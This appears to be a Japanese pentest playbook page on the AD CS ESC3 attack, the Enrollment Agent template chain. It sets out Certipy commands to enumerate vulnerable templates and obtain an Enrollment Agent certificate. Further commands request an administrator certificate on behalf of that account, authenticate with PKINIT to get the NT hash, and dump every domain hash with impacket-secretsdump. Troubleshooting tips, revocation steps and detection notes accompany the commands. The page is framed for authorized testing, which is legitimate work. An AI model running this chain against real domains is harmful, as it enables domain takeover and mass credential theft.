# ESC3 — Enrollment Agent テンプレートチェーン

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（代理申請した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。
> 演習環境では制約なし。

---

## 着火条件

以下の **2 テンプレートの組み合わせ** が揃ったときに実施する：

**条件A（Enrollment Agent テンプレート）：**

- `Enrollment Agent: True`（EKU = Certificate Request Agent）
- `Requires Manager Approval: False`
- `Authorized Signatures Required: 0`
- `Enrollment Rights` に低権限グループが含まれる

**条件B（代理申請先テンプレート）：**

- `Client Authentication: True`
- `Authorized Signatures Required: 1` 以上（Enrollment Agent 証明書による署名が必要）
- `Application Policies` に `Certificate Request Agent` が含まれる
- `Enrollment Rights` に低権限グループまたは Enrollment Agent が含まれる

**攻撃者の思考トレース：** Enrollment Agent は「他ユーザーの代わりに証明書を申請できる」特権証明書。通常はヘルプデスクやスマートカード管理者に使われる。条件A で Enrollment Agent 証明書を取得し、条件B のテンプレートで管理者名で代理申請することで ESC1 と同等の成果が得られる。テンプレートの `Enrollee Supplies Subject` が False でも有効なため ESC1 が使えない環境でも刺さる。

---

## 環境前提

- **実行環境**: テスター端末（ドメインユーザー権限・ネットワーク到達性があること）
- **必要なツール**: Certipy（`pip install certipy-ad --break-system-packages`。要インストール確認）
- **必要な権限**: 条件A テンプレートへの Enrollment 権限を持つドメインユーザー（低権限ユーザーで可）
- **オフライン代替**: Certipy 非使用環境では `certreq -policy` / `-submit` による手動 CSR + Enrollment Agent 証明書（Windows 端末要）

---

## 観点・着眼点

### 先に確認すること：2テンプレートの特定

```bash
# [Attacker] 脆弱テンプレートの列挙（ESC3 は2テンプレートの組み合わせで表示される）
certipy find \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout
```

ESC3 の出力例（2エントリが表示される）：

```
Certificate Templates
  0
    Template Name                       : [ENROLLMENT_AGENT_TEMPLATE]    ← 条件A
    Enrollment Agent                    : True
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Enrollment Rights                   : EXAMPLE.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC3 (Condition A)               : ...

  1
    Template Name                       : [TARGET_TEMPLATE]               ← 条件B
    Client Authentication               : True
    Requires Manager Approval           : False
    Authorized Signatures Required      : 1
    Application Policies                : Certificate Request Agent
    Enrollment Rights                   : EXAMPLE.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC3 (Condition B)               : ...
```

### 何が出たら次に何をするか

| シグナル | 判断 |
|---------|------|
| 条件A・条件B の両方が ESC3 として表示 | 手順 Step 1 → Step 2 へ |
| 条件A のみ（条件B が見つからない）| Enrollment Agent 証明書を取得しても代理申請先がない。ESC2 の Any Purpose 証明書が条件B を代替できる場合あり |
| 条件B の `Authorized Signatures Required: 0` | ESC3 ではなく ESC1 相当で直接申請できる可能性あり |

---

## 手順

事前準備（必須）：時刻同期

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

### Step 1: Enrollment Agent 証明書を取得（条件A テンプレート）

```bash
# [Attacker] Enrollment Agent 証明書を取得
certipy req \
  -ca [CA_NAME] \
  -template [ENROLLMENT_AGENT_TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP]
# → [USER].pfx が生成される（Enrollment Agent 証明書）
```

### Step 2: 取得した Enrollment Agent 証明書で任意ユーザー名の証明書を代理申請（条件B テンプレート）

```bash
# [Attacker] Enrollment Agent 証明書を使って administrator の証明書を代理申請
certipy req \
  -ca [CA_NAME] \
  -template [TARGET_TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -on-behalf-of [DOMAIN]\administrator \
  -pfx [USER].pfx
# -on-behalf-of: 代理申請先のユーザー名（[DOMAIN]\[TARGET_USER] 形式）
# -pfx: Step 1 で取得した Enrollment Agent 証明書
# → administrator.pfx が生成される
```

### Step 3: PKINIT 認証 → NT ハッシュ取得 → DCSync

```bash
# [Attacker] PKINIT 認証 → NT ハッシュ取得
certipy auth \
  -pfx administrator.pfx \
  -dc-ip [DC_IP]

# [Attacker] NT ハッシュで DCSync
impacket-secretsdump \
  -just-dc-ntlm \
  -no-pass \
  -hashes :[NT_HASH] \
  [DOMAIN]/administrator@[DC_IP]
```

### 原状回復：証明書の失効

```bash
# [Attacker] 取得した2枚の証明書を両方失効
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID_STEP1]

certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID_STEP2]
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `certipy req` Step 2 が `CERTSRV_E_MISSING_REQUESTOR_SUBJECT` | `-on-behalf-of` の形式を確認（`[DOMAIN]\[USER]` 形式が必要）|
| Step 2 が `CERTSRV_E_SIGNATURE_KEY_LENGTH_MISMATCH` | 条件B テンプレートの最小鍵長が条件A で生成した鍵長より長い。`-key-size 4096` 等で調整 |
| 条件B テンプレートが見つからない | Any Purpose テンプレート（ESC2）が条件B の代替になる場合がある。ESC2 で取得した証明書を `-pfx` に指定して Step 2 を試す |
| 両条件が揃っていない | ESC1 / ESC2 / ESC6 が使えるか再確認する |

---

## 注意点・落とし穴

- **Step 1 と Step 2 の REQUEST_ID は別々に記録する**：両方の証明書をテスト完了時に失効する必要がある
- **条件B の `Authorized Signatures Required` は 1 が正常**：0 であれば ESC3 を使わずに直接申請できる（ESC1 相当）
- **`-on-behalf-of` に指定するユーザーの UPN 確認が必要**：`administrator` の実際の UPN（`administrator@example.local` 形式）と `[DOMAIN]\administrator` 形式の違いに注意。Certipy は `[DOMAIN]\[SAMAccountName]` を受け付ける

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。Enrollment Agent 機能の悪用はドメイン全体への影響
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（条件A・B の各証明書発行）/ 4768（TGT 要求）/ MDI「Enrollment Agent による疑わしい証明書申請」
- **業務影響リスク**: 証明書発行自体は業務影響なし。DCSync は全ハッシュ取得のため書面承認必須
- **原状回復必須項目**: ✅ 条件A・条件B 双方の証明書を CA で失効 / ✅ pfx・NT ハッシュ・TGT の暗号化保管・テスト完了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：ESC2（Any Purpose 証明書が Enrollment Agent 代替になる） → `./ESC2.md`
- 後：PKINIT → NT ハッシュ取得 → DCSync → `../Credential_Dumping.md`
- 後：横展開（DCSync 取得後） → `../Kerberos_Attacks/Pass_The_Ticket.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
